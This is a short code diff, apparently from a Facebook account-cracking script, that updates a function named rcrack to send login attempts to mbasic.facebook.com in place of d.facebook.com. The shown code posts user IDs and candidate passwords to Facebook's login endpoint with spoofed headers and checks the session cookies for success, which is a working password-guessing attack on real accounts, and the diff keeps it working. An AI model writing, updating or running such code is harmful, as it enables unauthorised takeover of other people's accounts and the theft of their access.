@@ -364,7 +364,7 @@ def rcrack(uid,pwx,tl):
 
             session = requests.Session()
 
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
 
             log_data = {
 
@@ -386,7 +386,7 @@ def rcrack(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb = {'authority': 'd.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -405,7 +405,7 @@ def rcrack(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent':pro}
 
-            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
